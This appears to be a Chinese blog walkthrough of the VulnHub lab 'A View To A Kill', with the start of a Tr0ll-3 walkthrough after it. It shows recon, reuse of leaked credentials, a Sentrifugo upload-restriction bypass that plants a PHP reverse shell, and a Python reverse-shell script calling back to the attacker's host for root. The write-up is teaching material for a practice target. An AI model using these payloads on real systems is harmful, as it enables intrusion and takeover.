<li>学习目标：Web应用程序安全性，脚本，Linux枚举等。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub171.jpg"></p>
<p>顺带说一句，这个靶机的背景图挺酷的。。。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.112</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 08:00:27:B0:44:15 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -Pn -v 192.168.56.112</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp   open  smtp    Postfix smtpd</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">8191/tcp open  http    PHP cli server 5.5 or later</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -sC -v -A -Pn -p 22,25,80,8191 -sV 192.168.56.112</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 54:8e:3a:14:b2:be:03:5c:d4:08:3a:ed:bb:e1:55:53 (RSA)</span><br><span class="line">|   256 aa:be:cb:e1:b6:7f:47:75:29:f7:63:e5:f9:39:78:2e (ECDSA)</span><br><span class="line">|_  256 de:1c:31:e0:15:4d:f5:dc:8e:bc:3c:e4:7d:64:75:54 (ED25519)</span><br><span class="line">25/tcp   open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: rain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, </span><br><span class="line">| ssl-cert: Subject: commonName=rain</span><br><span class="line">| Subject Alternative Name: DNS:rain</span><br><span class="line">| Issuer: commonName=rain</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2019-07-22T22:11:20</span><br><span class="line">| Not valid after:  2029-07-19T22:11:20</span><br><span class="line">| MD5:   04a9 b97a 8bf2 dc6b 02f2 382b 075b 2e51</span><br><span class="line">|_SHA-1: a4e5 f2f5 efbf 5a3a 215a 9c96 6f9d 10f4 a94e 85bb</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET POST OPTIONS</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_/joomla /zorin /dev /defense</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: A View To A Kill</span><br><span class="line">8191/tcp open  http    PHP cli server 5.5 or later</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: electronic controller app</span><br></pre></td></tr></table></figure>

<p>查看端口80登陆apache默认页面。检查robots.txt显示了几个目录。检查每一个</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /joomla</span><br><span class="line">Disallow: /zorin</span><br><span class="line">Disallow: /dev</span><br><span class="line">Disallow: /defense</span><br></pre></td></tr></table></figure>

<p>/joomla播放一个webm文件，/zorin好像是有关公司和员工登录信息的信息。./dev是一个打开的目录，其中包含文件和备份文件的列表，因此我将必须检查所有文件，/defense也会播放一个webm文件。</p>
<p>返回/zorin并单击HR boarding。发现有一个用于人力资源管理的/sentrifugo和一个有趣的注释</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub172.jpg"></p>
<p>进入/sentrifugo这是一个登录页面。但没有任何用户名或密码开始。所以从/dev open目录及其中的文件开始，这可能会导致某些问题。并且确定文件e_bkup.tar.gz是否包含登录信息。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub173.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub174.jpg"></p>
<p>压缩包里面有几个文件分别储存了下面的内容</p>
<p>New_Employee_Onboarding_Chuck.rtf:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Greeting Chuck, We welcome you to the team! Please login to our HR mgmt portal(<span class="built_in">which</span> we spoke of) and fill out your profile and Details. Make sure to enter <span class="keyword">in</span> the descrption of your CISSP under Training &amp; Certificate Details since you mentioned you have it. I will be checking that section often as I need to fill out related paperwork. Login username: chuck@localhost.com and password is the lowercase word/txt from the cool R&amp;D video I showed you with the remote detonator + the transmit frequency of an HID proxcard reader - so password format example: facility007. Sorry <span class="keyword">for</span> the rigmarole, the Security folks will <span class="built_in">kill</span> me <span class="keyword">if</span> I send passwords <span class="keyword">in</span> clear text. We make some really neat tech here at Zorin, glad you joined the team Chuck Lee! </span><br></pre></td></tr></table></figure>

<p>note_to_mail_admins.txt:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Yo, wassup computer geeks! I was told by design to upload a few example emails <span class="keyword">for</span> you nerds to work with <span class="keyword">in</span> prep <span class="keyword">for</span> what they called <span class="string">&quot;email web gooey platform&quot;</span>.  </span><br></pre></td></tr></table></figure>

<p>onboarding_email_template.rtf:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Greeting EMPLOYEE, We welcome you to the team! Please login to our HR mgmt portaland fill out your profile and Details. Login username: USERNAME@localhost.com and password is: PASSWORD. INSERT ORG SPECIFIC PHRASE, glad you joined the team EMPLOYEE! </span><br></pre></td></tr></table></figure>

<p>Stop_Storing_Passwords.rtf:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">All, I know you<span class="string">&#x27;re close with Max, but you can&#x27;</span>t keep storing your credentials <span class="keyword">in</span> txt files on your desktop! We already have had complaints of the apps inactivity auto <span class="built_in">logout</span> feature, but 5 seconds is high enough <span class="keyword">in</span> my professional opinion. Simply copy pasting credentials <span class="keyword">in</span> the login fields is bad practice, even <span class="keyword">if</span> password requirments are <span class="built_in">set</span> to 32 characters minimun! - Scarpine - Head of Security - CSO CIO</span><br></pre></td></tr></table></figure>

<p>所以现在知道用户名是<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjMTA0OyYjMTE3OyYjOTk7JiMxMDc7JiM2NDsmIzEwODsmI3g2ZjsmI3g2MzsmIzk3OyYjMTA4OyYjeDY4OyYjMTExOyYjeDczOyYjMTE2OyYjeDJlOyYjeDYzOyYjMTExOyYjMTA5Ow==">&#x63;&#104;&#117;&#99;&#107;&#64;&#108;&#x6f;&#x63;&#97;&#108;&#x68;&#111;&#x73;&#116;&#x2e;&#x63;&#111;&#109;<i class="fa fa-external-link-alt"></i></span>，知道密码应该是什么。所以继续尝试连接有关密码的所有部分。在该打开的目录中，有一个名为remote_control.gif的文件。其中显示单词HELICOPTER的文件，还有一个名为HID6005.pdf的文件，在规范部分，发送频率为125kHz。helicopter125应该是密码！并且肯定是的。</p>
<p>能够登录到人力资源管理。找不到任何有趣的东西，所以决定寻找sendrifugo漏洞，并且有几对我将使用exploitdb列出的第一个漏洞<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDczMjM=">Sentrifugo-3-2-File-Upload-Restriction-Bypass<i class="fa fa-external-link-alt"></i></span></p>
<p>发现可以在收据下的“费用”部分上传某些类型的文件。将php-reverse-shell文件重命名为phpreverseshell1.php.doc并上传，并用burp拦截了将文件名更改为phpreverseshell1.php的请求。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub175.gif"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub176.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub177.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub178.jpg"></p>
<p>访问下面的url，成功弹回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.112/sentrifugo/public/uploads/expenses_receipts/1579806690_3_phpreverseshell1.php</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.112: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.112] 55570</span><br><span class="line">Linux view 4.15.0-66-generic <span class="comment">#75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 19:12:10 up  1:23,  0 users,  load average: 0.00, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@view:/$</span></span><br></pre></td></tr></table></figure>
<p>在/home/jenny目录下发现一个压缩包，将它下载下来看看里面有什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@view:/home/jenny$ ls</span><br><span class="line">ls</span><br><span class="line">dsktp_backup.zip</span><br><span class="line">www-data@view:/home/jenny$ python -m SimpleHTTPServer</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub179.jpg"></p>
<p>passswords.txt:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hr mgmt - NO ACCESS ANYMORE</span><br><span class="line">jenny@localhost.com</span><br><span class="line">ThisisAreallYLONGPAssw0rdWHY!!!!</span><br><span class="line"></span><br><span class="line">ssh</span><br><span class="line">jenny</span><br><span class="line">!!!sfbay!!!</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh jenny@192.168.56.112</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">jenny@192.168.56.112<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-66-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Thu Jan 23 19:58:43 UTC 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0                Processes:              206</span></span><br><span class="line"><span class="string">  Usage of /:   65.0% of 11.75GB   Users logged in:        0</span></span><br><span class="line"><span class="string">  Memory usage: 50%                IP address for enp0s17: 192.168.56.112</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">181 packages can be updated.</span></span><br><span class="line"><span class="string">0 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Jan 23 19:42:33 2020 from 192.168.56.102</span></span><br><span class="line"><span class="string">jenny@view:~$ id</span></span><br><span class="line"><span class="string">uid=1007(jenny) gid=1007(jenny) groups=1007(jenny)</span></span><br><span class="line"><span class="string">jenny@view:~$ whoami</span></span><br><span class="line"><span class="string">jenny</span></span><br></pre></td></tr></table></figure>

<p>todo.txt:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TODO</span><br><span class="line"></span><br><span class="line">-Give feedback to marketing on logo (it currently looks like the banner ouside a cheap Italian reseaurant!!)</span><br><span class="line">    -The Boss likes the original, so I guess we<span class="string">&#x27;re keeping it :/</span></span><br><span class="line"><span class="string">-Push final script to /home/max/aView.py</span></span><br><span class="line"><span class="string">    -Waiting on devs and mechanical eng. to finalize programs (no way for QA to test this one! Yikes!)</span></span><br><span class="line"><span class="string">-Verify James Bond is MI6. They may be on to us.</span></span><br><span class="line"><span class="string">    -Security says they are trying to infltrate our servers, so they pushed out a new password policy. </span></span><br><span class="line"><span class="string">    -Head of Security said this policy will solve all security related problems after I confronted him about it.</span></span><br><span class="line"><span class="string">-Make a habit of deleting pointless emails.</span></span><br><span class="line"><span class="string">-Migrate needed desktop items to Linux server.</span></span><br></pre></td></tr></table></figure>

<p>进入max目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@view:/home$ <span class="built_in">cd</span> max</span><br><span class="line"><span class="built_in">cd</span> max</span><br><span class="line">www-data@view:/home/max$ ls</span><br><span class="line">ls</span><br><span class="line">aView.py  note.txt</span><br><span class="line">www-data@view:/home/max$ cat note.txt</span><br><span class="line">cat note.txt</span><br><span class="line">Max,</span><br><span class="line"></span><br><span class="line">The electronic controller web application you asked <span class="keyword">for</span> is almost <span class="keyword">done</span>. Located on port 8191 this app will allow you to execute your plan from a remote location.</span><br><span class="line"></span><br><span class="line">The remote trigger is located <span class="keyword">in</span> a hidden web directory that only you should know - I verbally confirmed it with you. If you <span class="keyword">do</span> not recall, the directory is based on an algorithm:  SHA1(lowercase alpha(a-z) + <span class="string">&quot;view&quot;</span> + digit(0-9) + digit(0-9)).</span><br><span class="line"></span><br><span class="line">Example: SHA1(rview86) = 044c64c6964998ccb62e8facda730e8307f28de6 = http://&lt;ip&gt;:8191/044c64c6964998ccb62e8facda730e8307f28de6/</span><br><span class="line"></span><br><span class="line">- Scarpine</span><br><span class="line">www-data@view:/home/max$ cat aView.py</span><br><span class="line">cat aView.py</span><br><span class="line">cat: aView.py: Permission denied</span><br></pre></td></tr></table></figure>

<p>从note.txt了解到需要编写python脚本进行模糊测试</p>
<p>fuzzv2akill.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">from hashlib import sha1</span><br><span class="line"></span><br><span class="line">prefixes = [bytes([c]) <span class="keyword">for</span> c <span class="keyword">in</span> range(ord(<span class="string">&#x27;a&#x27;</span>), ord(<span class="string">&#x27;z&#x27;</span>) + 1)]</span><br><span class="line">xs = range(10)</span><br><span class="line">ys = range(10)</span><br><span class="line">suffixes = [bytes(f<span class="string">&#x27;&#123;x&#125;&#123;y&#125;&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> xs <span class="keyword">for</span> y <span class="keyword">in</span> ys]</span><br><span class="line">names = [prefix + b<span class="string">&#x27;view&#x27;</span> + suffix + b<span class="string">&#x27;\n&#x27;</span> <span class="keyword">for</span> prefix <span class="keyword">in</span> prefixes <span class="keyword">for</span> suffix <span class="keyword">in</span> suffixes]</span><br><span class="line">hashes = [sha1(n).hexdigest() <span class="keyword">for</span> n <span class="keyword">in</span> names]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> has <span class="keyword">in</span> hashes:</span><br><span class="line">    <span class="built_in">print</span>(has)</span><br></pre></td></tr></table></figure>

<p>使用dirb+fuzzv2akill.py进行模糊测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.112:8191 &lt;(python3 fuzzv2akill.py) -z 250</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jan 23 08:23:48 2020</span><br><span class="line">URL_BASE: http://192.168.56.112:8191/</span><br><span class="line">WORDLIST_FILES: /dev/fd/63</span><br><span class="line">SPEED_DELAY: 250 milliseconds</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 2600                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.112:8191/ ----</span><br><span class="line">+ http://192.168.56.112:8191/13fabf2bcd385cf87939748490f6a96955212567 (CODE:200|SIZE:147)                                 </span><br><span class="line">+ http://192.168.56.112:8191/d0fa319a11ef644862edf51b9177b9d62a1e6650 (CODE:200|SIZE:133)                                 </span><br><span class="line">+ http://192.168.56.112:8191/ece8236b92964611c75c759bb8c2297e3b962903 (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/7f98ca7ba1484c66bf09627f931448053ae6b55a (CODE:200|SIZE:815)                                 </span><br><span class="line">+ http://192.168.56.112:8191/fa05b73405e2996c69ad78ed1fa0f24b9da965ac (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/af92fb801e526655686899ae8341b9e7cfa21ea0 (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/f871c18649e03d2e9cd7414b95cde578f23dba8d (CODE:200|SIZE:147)                                 </span><br><span class="line">+ http://192.168.56.112:8191/0f3c6dc226621deac4d0a66e0f60785d923fc282 (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/03388bdd6c0ba6a112b0f0d3aca2f3775be0a007 (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/ef1cacc0f3b5aea1a0d56c5df4263580e7b23570 (CODE:200|SIZE:133)                                 </span><br><span class="line">+ http://192.168.56.112:8191/e57019d9886a12e8c27d9d3f4e46fac9603e8bc2 (CODE:200|SIZE:147)                                 </span><br><span class="line">+ http://192.168.56.112:8191/de5eb20114e281e2e514a64d98187d6f30c3c9b4 (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/e7642454c8c6047fd883a859580a0723657fcf45 (CODE:200|SIZE:115)                                 </span><br><span class="line">+ http://192.168.56.112:8191/ad3029ea9d74ebcbde60ec9abaf95ac6eed95490 (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/5a96f2b44b310535334d2b99258db5ea3eadd448 (CODE:200|SIZE:147)                                 </span><br><span class="line">+ http://192.168.56.112:8191/dd0cdfeb376f8e96d2325724eb000588c8cf70f5 (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/d7297045329f04a3bb4b35e629407343868820d4 (CODE:200|SIZE:147)                                 </span><br><span class="line">+ http://192.168.56.112:8191/72fd79c962996b32fc4b0a2a0c5c1b6b1aa860d4 (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/8eb11aa78f52090f8c32f81797e561d7fbd29fd7 (CODE:200|SIZE:147)                                 </span><br><span class="line">+ http://192.168.56.112:8191/f174b138d930be79ab383669319aecbdde70af6a (CODE:200|SIZE:119)                                 </span><br><span class="line">+ http://192.168.56.112:8191/2cfc36dfe3e7f20faa2ad9bc2091c25387844adf (CODE:200|SIZE:133)                                 </span><br><span class="line">+ http://192.168.56.112:8191/7c7b00a0a30137eaac46b32aaec2f9668d6a10d5 (CODE:200|SIZE:119)                                 </span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Jan 23 08:34:44 2020</span><br><span class="line">DOWNLOADED: 2600 - FOUND: 22</span><br></pre></td></tr></table></figure>

<p>然后将结果一个个的尝试，找到正确的url结果是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.112:8191/7f98ca7ba1484c66bf09627f931448053ae6b55a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub180.jpg"></p>
<p>点击按钮</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub181.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub182.gif"></p>
<p>记得在jenny主目录中有一个todo.txt文件，其中提到将最终脚本到/home/max/aView.py。所以转到该文件并对其进行了修改，使其在端口4444上获得了python reverse shell。在端口4444上启动了netcat监听器，然后再次返回该站点并再次单击execute按钮，然后我获得了root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># executed from php app add final wrapper/scirpt here</span></span><br><span class="line">import socket, subprocess, os</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.102&quot;</span>, 4444))</span><br><span class="line">os.dup2(s.fileno(), 0)</span><br><span class="line">os.dup2(s.fileno(), 1)</span><br><span class="line">os.dup2(s.fileno(), 2)</span><br><span class="line"></span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>返回了root权限的shell:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 4444</span></span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.56.112: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.112] 43356</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">index.html</span></span><br><span class="line"><span class="string">notes.txt</span></span><br><span class="line"><span class="string">run.php</span></span><br><span class="line"><span class="string">view11.gif</span></span><br><span class="line"><span class="string"># pwd</span></span><br><span class="line"><span class="string">/root/destroy/7f98ca7ba1484c66bf09627f931448053ae6b55a</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd flag</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">files</span><br><span class="line">index.php</span><br><span class="line">run_me_for_flag.sh</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/root/flag</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>在/root/flag目录下发现run_me_for_flag.sh脚本，先查看它的内容，然后运行它</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat run_me_for_flag.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-------------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-------------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Go here:   http://&lt;ip&gt;:8007&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-------------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-------------------------------&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /root/flag;php -S 0.0.0.0:8007</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./run_me_for_flag.sh</span></span><br><span class="line">-------------------------------</span><br><span class="line">-------------------------------</span><br><span class="line">Go here:   http://&lt;ip&gt;:8007</span><br><span class="line">-------------------------------</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure>

<p>然后访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.112:8007/</span><br></pre></td></tr></table></figure>

<p>得到最后的flag，还能点击播放背景音乐</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub182.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>登陆密码泄露</li>
<li>python脚本模糊测试</li>
<li>python reverse shell</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Tr0ll-3]</title>
    <url>/2020/04/07/Tr0ll-3/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Tr0ll: 3<br>发布日期：2019年8月6日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xSnNoejBWaWZNcnczUy1LY3E4QzNuZjlITVF0WHVLclcvdmlldw==">https://drive.google.com/file/d/1Jshz0VifMrw3S-Kcq8C3nf9HMQtXuKrW/view<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDMub3Zh">https://download.vulnhub.com/tr0ll/Tr0ll3.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDMub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/tr0ll/Tr0ll3.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Tr0ll系列的最新版本。这与之前的迭代略有不同，仍然处于Beginner++级别。希望每个人都玩得开心，请确保在flag的屏幕截图上标记@ Maleus21。</p>
<p>您将需要使用start：here登录ssh</p>
<p>类型：Boot 2 root<br>目标：获取flag.txt<br>难度：初学者++<br>娱乐级别：超过9000</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.120</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 08:00:27:C3:39:77 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -sV -p- 192.168.56.120</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure>

<p>使用默认的账号密码登录ssh</p>
